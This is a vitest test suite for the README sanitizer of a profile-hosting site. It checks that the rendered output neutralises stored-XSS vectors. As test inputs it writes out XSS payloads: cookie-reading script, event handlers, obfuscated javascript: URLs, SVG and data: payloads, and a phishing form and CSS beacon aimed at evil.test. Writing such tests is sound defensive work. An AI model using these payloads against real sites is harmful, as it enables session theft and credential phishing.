import { describe, expect, it } from "vitest"
import { renderReadme } from "../lib/parse"

// SECURITY — this suite is the gate on lib/parse.ts. Profile READMEs are
// arbitrary third-party markdown *and* HTML rendered on `*.is-pinoy.dev`, a
// cookie domain shared with the dashboard. A regression here is stored XSS
// against every other subdomain, so each vector below asserts on the *rendered
// output*, not on implementation details of the sanitizer.

/** Markers that must never survive into rendered HTML. */
function expectInert(html: string) {
  expect(html).not.toMatch(/<script/i)
  expect(html).not.toMatch(/<iframe/i)
  expect(html).not.toMatch(/<style/i)
  expect(html).not.toMatch(/javascript:/i)
  expect(html).not.toMatch(/\bon[a-z]+\s*=/i)
  expect(html).not.toMatch(/srcdoc/i)
}

describe("renderReadme — XSS matrix", () => {
  it("returns empty string for empty or whitespace-only input", async () => {
    expect(await renderReadme("")).toBe("")
    expect(await renderReadme("   \n\t  ")).toBe("")
  })

  it("strips <script> blocks, keeping surrounding prose", async () => {
    const html = await renderReadme(
      "Hello\n\n<script>window.alert(document.cookie)</script>\n\nWorld",
    )
    expectInert(html)
    expect(html).not.toContain("document.cookie")
    expect(html).toContain("Hello")
    expect(html).toContain("World")
  })

  it("strips inline event handlers from allowed tags", async () => {
    const html = await renderReadme(
      `<p onmouseover="alert(1)" onclick="alert(2)">hover me</p>`,
    )
    expectInert(html)
    expect(html).toContain("hover me")
  })

  it("drops javascript: hrefs but keeps the link text", async () => {
    const html = await renderReadme(`[click](javascript:alert(1))`)
    expectInert(html)
    expect(html).toContain("click")
  })

  it("drops javascript: hrefs written as raw HTML", async () => {
    const html = await renderReadme(
      `<a href="javascript:alert(document.domain)">x</a>`,
    )
    expectInert(html)
  })

  it("neutralizes case- and entity-obfuscated javascript: URLs", async () => {
    for (const href of [
      "JaVaScRiPt:alert(1)",
      "java\tscript:alert(1)",
      " javascript:alert(1)",
      "&#106;avascript:alert(1)",
    ]) {
      const html = await renderReadme(`<a href="${href}">x</a>`)
      expectInert(html)
    }
  })

  it("strips <style> blocks and CSS injection", async () => {
    const html = await renderReadme(
      `<style>body{background:url("https://evil.test/beacon")}</style>\n\ntext`,
    )
    expectInert(html)
    expect(html).not.toContain("evil.test")
    expect(html).toContain("text")
  })

  it("strips style attributes so a README cannot reskin the page", async () => {
    const html = await renderReadme(
      `<p style="position:fixed;inset:0;background:#000;z-index:9999">overlay</p>`,
    )
    expect(html).not.toMatch(/style=/i)
    expect(html).toContain("overlay")
  })

  it("strips <iframe>, <object>, and <embed>", async () => {
    const html = await renderReadme(
      [
        `<iframe src="https://evil.test">fallback copy</iframe>`,
        `<object data="https://evil.test/x.swf"></object>`,
        `<embed src="https://evil.test/x.swf">`,
      ].join("\n\n"),
    )
    expectInert(html)
    expect(html).not.toMatch(/<object/i)
    expect(html).not.toMatch(/<embed/i)
    expect(html).not.toContain("evil.test")
    expect(html).not.toContain("fallback copy")
  })

  it("defuses a phishing form: no <form>, no live inputs", async () => {
    const html = await renderReadme(
      `<form action="https://evil.test/phish"><input name="password" type="password"><button>Sign in</button></form>`,
    )
    expectInert(html)
    expect(html).not.toMatch(/<form/i)
    expect(html).not.toMatch(/<button/i)
    expect(html).not.toContain("evil.test")
    // The sanitizer keeps <input> only as a GFM task-list checkbox, forcing it
    // inert: any surviving input is disabled and type=checkbox, never a
    // credential field. Asserted here so that guarantee can't silently regress.
    for (const input of html.match(/<input\b[^>]*>/gi) ?? []) {
      expect(input).toContain("disabled")
      expect(input).toContain('type="checkbox"')
      expect(input).not.toMatch(/type="password"/i)
    }
  })

  it("removes the text content of stripped elements, not just their tags", async () => {
    // Regression: <style>/<title>/<textarea> had their tag dropped but their
    // text kept, dumping CSS source and hidden copy onto the page as prose.
    const html = await renderReadme(
      [
        `<style>.x{color:red}</style>`,
        `<title>injected title</title>`,
        `<textarea>hidden copy</textarea>`,
        `keep me`,
      ].join("\n\n"),
    )
    expect(html).not.toContain(".x{color:red}")
    expect(html).not.toContain("injected title")
    expect(html).not.toContain("hidden copy")
    expect(html).toContain("keep me")
  })

  it("strips <svg> payloads", async () => {
    const html = await renderReadme(
      `<svg><script>alert(1)</script><animate onbegin="alert(2)"></animate></svg>`,
    )
    expectInert(html)
    expect(html).not.toMatch(/<svg/i)
    expect(html).not.toMatch(/<animate/i)
  })

  it("strips <base> and <meta> so redirects cannot be injected", async () => {
    const html = await renderReadme(
      `<base href="https://evil.test/">\n\n<meta http-equiv="refresh" content="0;url=https://evil.test">`,
    )
    expect(html).not.toMatch(/<base/i)
    expect(html).not.toMatch(/<meta/i)
    expect(html).not.toContain("evil.test")
  })

  it("drops data: and non-https image sources", async () => {
    const html = await renderReadme(
      [
        `<img src="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+">`,
        `<img src="http://insecure.test/pixel.png">`,
        `<img src="//evil.test/pixel.png">`,
      ].join("\n\n"),
    )
    expectInert(html)
    expect(html).not.toContain("data:image")
    expect(html).not.toContain("insecure.test")
    expect(html).not.toContain("evil.test")
  })

  it("drops images from hosts outside the allow-list, including look-alikes", async () => {
    const html = await renderReadme(
      [
        `<img src="https://tracker.test/beacon.gif">`,
        `<img src="https://img.shields.io.evil.test/badge.svg">`,
        `<img src="https://evil.test/x?a=raw.githubusercontent.com">`,
      ].join("\n\n"),
    )
    expect(html).not.toContain("tracker.test")
    expect(html).not.toContain("evil.test")
  })

  it("drops onerror images even when the src looks benign", async () => {
    const html = await renderReadme(
      `<img src="https://img.shields.io/badge/a-b-blue" onerror="alert(1)">`,
    )
    expectInert(html)
  })
})

describe("renderReadme — legitimate content survives", () => {
  it("keeps allow-listed badge and avatar images", async () => {
    const html = await renderReadme(
      [
        `![badge](https://img.shields.io/badge/build-passing-green)`,
        `<img src="https://avatars.githubusercontent.com/u/1?v=4" alt="me">`,
        `<img src="https://raw.githubusercontent.com/o/r/main/banner.png" alt="banner">`,
      ].join("\n\n"),
    )
    expect(html).toContain("img.shields.io/badge/build-passing-green")
    expect(html).toContain("avatars.githubusercontent.com")
    expect(html).toContain("raw.githubusercontent.com")
  })

  it("keeps the raw HTML profile READMEs actually use", async () => {
    const html = await renderReadme(
      `<h1 align="center">Juan</h1>\n<p align="center">Dev from Manila</p>`,
    )
    expect(html).toContain("Juan")
    expect(html).toContain("Dev from Manila")
    // The heading survives as a heading — demoted, because the template owns
    // the page's H1. See the document-structure suite below.
    expect(html).toMatch(/<h2/i)
  })

  it("renders GFM tables, task lists, and fenced code", async () => {
    const html = await renderReadme(
      [
        "| a | b |",
        "| - | - |",
        "| 1 | 2 |",
        "",
        "- [x] done",
        "- [ ] todo",
        "",
        "```ts",
        "const x: number = 1",
        "```",
      ].join("\n"),
    )
    expect(html).toMatch(/<table/i)
    expect(html).toMatch(/<code/i)
    expect(html).toContain("const x: number = 1")
  })

  it("escapes text that looks like markup instead of executing it", async () => {
    const html = await renderReadme("Use `<script>` tags carefully")
    expectInert(html)
    expect(html).toContain("&#x3C;script>")
  })

  it("keeps http, https, and mailto links", async () => {
    const html = await renderReadme(
      `[a](https://example.test) [b](http://example.test) [c](mailto:me@example.test)`,
    )
    expect(html).toContain('href="https://example.test"')
    expect(html).toContain('href="http://example.test"')
    expect(html).toContain('href="mailto:me@example.test"')
  })
})

// The README is embedded inside a page the template already owns the top of.
// These assertions are what keeps the merged document valid for a crawler and a
// screen reader — see the site-audit tool's H1 and image-alt checks.
describe("renderReadme — document structure", () => {
  it("demotes every heading so the template keeps the only H1", async () => {
    const html = await renderReadme(
      ["# Hi there", "", "## Projects", "", "### Details"].join("\n"),
    )
    expect(html).not.toMatch(/<h1/i)
    expect(html).toContain("<h2>Hi there</h2>")
    expect(html).toContain("<h3>Projects</h3>")
    expect(html).toContain("<h4>Details</h4>")
  })

  it("demotes headings nested inside the raw HTML wrappers READMEs use", async () => {
    const html = await renderReadme(
      `<div align="center"><h1>Juan</h1><h2>Backend</h2></div>`,
    )
    expect(html).not.toMatch(/<h1/i)
    expect(html).toContain("<h2>Juan</h2>")
    expect(html).toContain("<h3>Backend</h3>")
  })

  it("leaves H6 alone rather than inventing an H7", async () => {
    const html = await renderReadme("###### Fine print")
    expect(html).toContain("<h6>Fine print</h6>")
  })

  it("marks an image with no alt as decorative rather than leaving it bare", async () => {
    const html = await renderReadme(
      `<img src="https://img.shields.io/badge/build-passing-green">`,
    )
    expect(html).toContain('alt=""')
  })

  it("never overwrites an alt the author wrote", async () => {
    const html = await renderReadme(
      `![Build status](https://img.shields.io/badge/build-passing-green)`,
    )
    expect(html).toContain('alt="Build status"')
  })
})
